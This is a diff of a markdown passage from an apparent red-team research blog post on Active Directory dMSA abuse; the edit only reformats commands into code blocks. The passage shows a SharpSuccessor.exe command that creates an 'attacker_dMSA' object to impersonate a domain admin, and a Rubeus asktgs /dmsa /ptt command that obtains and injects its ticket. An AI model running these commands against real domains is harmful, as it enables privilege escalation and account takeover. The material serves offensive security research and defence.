@@ -65,13 +65,17 @@ Before starting to write the BOF, I decided I would expand SharpSuccessor to per
 
 SharpSuccessor functions just about the exact same as it did pre-patch, just with some additional post-patch functionality. We can utilize the OU TestOU’s location, an account which we have GenericWrite access over which we want to impersonate (in this case, domainadmin, our current context domainuser, and a name for our malicious dMSA object), all to create and weaponize a dMSA object for account impersonation.
 
-`SharpSuccessor.exe add /impersonate:domainadmin /path:"OU=TestOU,DC=ludus,DC=domain" /account:domainuser /name:attacker_dMSA`
+```
+SharpSuccessor.exe add /impersonate:domainadmin /path:"OU=TestOU,DC=ludus,DC=domain" /account:domainuser /name:attacker_dMSA
+```
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2025/10/image_57193f.png?w=1024)
 
 Then, like usual, we can utilize a ticket from our current context which we can request with tgtdeleg or dump from the Local Security Authority (LSA), to request a ticket under the dMSA’s context using Rubeus’s /dmsa authentication.
 
-`Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/ludus.domain /opsec /dmsa /nowrap /ptt /ticket:doIFl…`
+```
+Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/ludus.domain /opsec /dmsa /nowrap /ptt /ticket:doIFl…
+```
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2025/10/image_e301ad.png?w=1024)
 
